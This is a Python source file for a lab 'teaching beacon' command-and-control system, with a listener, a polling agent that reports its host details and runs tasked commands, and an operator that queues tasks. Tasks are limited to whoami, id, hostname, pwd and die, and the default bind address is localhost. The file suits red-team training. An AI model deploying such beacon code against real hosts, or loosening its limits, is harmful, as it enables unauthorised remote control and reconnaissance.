#!/usr/bin/env python3
"""
C2 Lab Template (Teaching Beacon)
=================================

Lab-contained HTTP C2: listener + agent + operator tasking.
Follow ai_agent_instructions/17_C2_POSTEX_LAB_STANDARD.md (Tier C1 default).

Category: Red Team / C2 Lab
Author: Security Research Lab
Version: 1.0.0
Date: 2026-09-06

Usage:
    python c2_lab_template.py listener --bind 127.0.0.1 --port 8443 --token LABTOKEN
    python c2_lab_template.py agent --url http://127.0.0.1:8443 --token LABTOKEN --ttl 120
    python c2_lab_template.py operator --url http://127.0.0.1:8443 --token LABTOKEN --task whoami
    python c2_lab_template.py full --url http://127.0.0.1:8443 --token LABTOKEN

Legal: Authorized lab only. See 02_LEGAL_CONTEXT.md / 17_C2_POSTEX_LAB_STANDARD.md.
"""

from __future__ import annotations

from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any, Optional
from urllib.parse import urlparse
from urllib.request import Request, urlopen

import argparse
import json
import logging
import os
import platform
import subprocess
import sys
import threading
import time
import uuid

HEADER_MARK = "X-Lab-C2"
ALLOWLIST_TASKS = {"whoami", "id", "hostname", "pwd", "die"}


def setup_log(verbose: bool = False) -> logging.Logger:
    log = logging.getLogger("c2_lab")
    log.setLevel(logging.DEBUG if verbose else logging.INFO)
    if not log.handlers:
        h = logging.StreamHandler(sys.stdout)
        h.setFormatter(logging.Formatter("[*] %(message)s"))
        log.addHandler(h)
    return log


logger = setup_log()


class TeamState:
    def __init__(self, token: str):
        self.token = token
        self.agents: dict[str, dict[str, Any]] = {}
        self.tasks: dict[str, list[dict[str, Any]]] = {}
        self.results: list[dict[str, Any]] = []
        self.lock = threading.Lock()


def _json_response(handler: BaseHTTPRequestHandler, code: int, payload: dict) -> None:
    body = json.dumps(payload).encode()
    handler.send_response(code)
    handler.send_header("Content-Type", "application/json")
    handler.send_header("Content-Length", str(len(body)))
    handler.send_header(HEADER_MARK, "1")
    handler.end_headers()
    handler.wfile.write(body)


def make_handler(state: TeamState):
    class Handler(BaseHTTPRequestHandler):
        def log_message(self, fmt, *args):
            logger.debug("%s - %s", self.address_string(), fmt % args)

        def _auth(self) -> bool:
            return self.headers.get("Authorization", "") == f"Bearer {state.token}"

        def do_POST(self):
            if not self._auth():
                return _json_response(self, 401, {"error": "unauthorized"})
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length) if length else b"{}"
            try:
                data = json.loads(raw.decode() or "{}")
            except json.JSONDecodeError:
                return _json_response(self, 400, {"error": "bad json"})

            path = urlparse(self.path).path
            if path == "/checkin":
                aid = data.get("agent_id") or str(uuid.uuid4())
                with state.lock:
                    state.agents[aid] = {
                        "agent_id": aid,
                        "hostname": data.get("hostname"),
                        "platform": data.get("platform"),
                        "last_seen": datetime.now(timezone.utc).isoformat(),
                    }
                    queue = state.tasks.setdefault(aid, [])
                    # Inherit broadcast tasks queued before this agent existed
                    broadcast = state.tasks.get("*") or []
                    while broadcast:
                        queue.append(broadcast.pop(0))
                    task = queue.pop(0) if queue else None
                return _json_response(self, 200, {"agent_id": aid, "task": task})

            if path == "/result":
                with state.lock:
                    state.results.append(data)
                logger.info("Result from %s: %s", data.get("agent_id"), data.get("output", "")[:200])
                return _json_response(self, 200, {"ok": True})

            if path == "/task":
                aid = data.get("agent_id")
                cmd = data.get("cmd")
                if cmd not in ALLOWLIST_TASKS:
                    return _json_response(self, 400, {"error": "cmd not allowlisted", "allow": sorted(ALLOWLIST_TASKS)})
                with state.lock:
                    state.tasks.setdefault(aid or "*", []).append({"cmd": cmd, "id": str(uuid.uuid4())})
                    # also queue for all known agents if aid missing
                    if not aid:
                        for existing in state.agents:
                            state.tasks.setdefault(existing, []).append({"cmd": cmd, "id": str(uuid.uuid4())})
                return _json_response(self, 200, {"queued": True, "cmd": cmd})

            if path == "/status":
                with state.lock:
                    payload = {
                        "agents": list(state.agents.values()),
                        "results": state.results[-20:],
                        "pending": {k: len(v) for k, v in state.tasks.items()},
                    }
                return _json_response(self, 200, payload)

            return _json_response(self, 404, {"error": "not found"})

        def do_GET(self):
            if urlparse(self.path).path == "/health":
                return _json_response(self, 200, {"ok": True, "lab": "c2"})
            return self.do_POST() if False else _json_response(self, 404, {"error": "not found"})

    return Handler


def run_listener(bind: str, port: int, token: str) -> None:
    state = TeamState(token)
    server = ThreadingHTTPServer((bind, port), make_handler(state))
    logger.info("Listener on http://%s:%d (header %s)", bind, port, HEADER_MARK)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Listener stopped")
        server.shutdown()


def _http_json(url: str, token: str, path: str, payload: dict, timeout: int = 10) -> dict:
    body = json.dumps(payload).encode()
    req = Request(
        url.rstrip("/") + path,
        data=body,
        method="POST",
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token}",
            HEADER_MARK: "1",
        },
    )
    with urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode())


def run_task_local(cmd: str) -> str:
    if cmd == "die":
        return "dying"
    if cmd == "hostname":
        return platform.node()
    if cmd == "pwd":
        return os.getcwd()
    if cmd == "whoami":
        return subprocess.check_output(["whoami"], text=True).strip()
    if cmd == "id":
        try:
            return subprocess.check_output(["id"], text=True).strip()
        except Exception:
            return subprocess.check_output(["whoami"], text=True).strip()
    return "unsupported"


def run_agent(url: str, token: str, ttl: int, interval: float, agent_id: Optional[str] = None) -> dict:
    deadline = time.time() + ttl
    last_output = None
    while time.time() < deadline:
        try:
            data = _http_json(
                url,
                token,
                "/checkin",
                {
                    "agent_id": agent_id,
                    "hostname": platform.node(),
                    "platform": platform.platform(),
                },
            )
            agent_id = data.get("agent_id") or agent_id
            task = data.get("task")
            if task and task.get("cmd"):
                cmd = task["cmd"]
                logger.info("Task: %s", cmd)
                out = run_task_local(cmd)
                last_output = out
                _http_json(
                    url,
                    token,
                    "/result",
                    {"agent_id": agent_id, "cmd": cmd, "output": out, "ts": datetime.now(timezone.utc).isoformat()},
                )
                if cmd == "die":
                    break
        except Exception as exc:
            logger.warning("checkin failed: %s", exc)
        time.sleep(interval)
    return {"agent_id": agent_id, "last_output": last_output}


def run_operator(url: str, token: str, task: str, agent_id: Optional[str] = None) -> dict:
    return _http_json(url, token, "/task", {"agent_id": agent_id, "cmd": task})


def run_full(url: str, token: str, bind: str, port: int) -> dict:
    """Spawn listener thread, agent, queue whoami, collect result."""
    t = threading.Thread(target=run_listener, args=(bind, port, token), daemon=True)
    t.start()
    time.sleep(0.3)
    base = url or f"http://{bind}:{port}"
    # Register agent first, then queue task for that agent id
    first = _http_json(
        base,
        token,
        "/checkin",
        {"hostname": platform.node(), "platform": platform.platform()},
    )
    aid = first.get("agent_id")
    run_operator(base, token, "whoami", agent_id=aid)
    agent = run_agent(base, token, ttl=15, interval=0.5, agent_id=aid)
    status = _http_json(base, token, "/status", {})
    return {
        "mode": "full",
        "agent": agent,
        "status": status,
        "verified": bool(agent.get("last_output")),
        "evidence": [agent.get("last_output")] if agent.get("last_output") else [],
    }


def main() -> None:
    p = argparse.ArgumentParser(description="Lab C2 (Tier C1 teaching beacon)")
    sub = p.add_subparsers(dest="cmd", required=True)

    pl = sub.add_parser("listener")
    pl.add_argument("--bind", default="127.0.0.1")
    pl.add_argument("--port", type=int, default=8443)
    pl.add_argument("--token", default="LABTOKEN")

    pa = sub.add_parser("agent")
    pa.add_argument("--url", default="http://127.0.0.1:8443")
    pa.add_argument("--token", default="LABTOKEN")
    pa.add_argument("--ttl", type=int, default=120)
    pa.add_argument("--interval", type=float, default=2.0)

    po = sub.add_parser("operator")
    po.add_argument("--url", default="http://127.0.0.1:8443")
    po.add_argument("--token", default="LABTOKEN")
    po.add_argument("--task", choices=sorted(ALLOWLIST_TASKS), default="whoami")
    po.add_argument("--agent-id")

    pf = sub.add_parser("full", help="listener+task+agent smoke in-process")
    pf.add_argument("--bind", default="127.0.0.1")
    pf.add_argument("--port", type=int, default=8443)
    pf.add_argument("--token", default="LABTOKEN")
    pf.add_argument("--url", default="")
    pf.add_argument("--output")

    p.add_argument("-v", "--verbose", action="store_true")
    args = p.parse_args()
    if args.verbose:
        logger.setLevel(logging.DEBUG)

    if args.cmd == "listener":
        run_listener(args.bind, args.port, args.token)
    elif args.cmd == "agent":
        print(json.dumps(run_agent(args.url, args.token, args.ttl, args.interval), indent=2))
    elif args.cmd == "operator":
        print(json.dumps(run_operator(args.url, args.token, args.task, args.agent_id), indent=2))
    elif args.cmd == "full":
        result = run_full(args.url, args.token, args.bind, args.port)
        if args.output:
            with open(args.output, "w", encoding="utf-8") as f:
                json.dump(result, f, indent=2)
        print(json.dumps(result, indent=2))
        sys.exit(0 if result.get("verified") else 1)


if __name__ == "__main__":
    main()
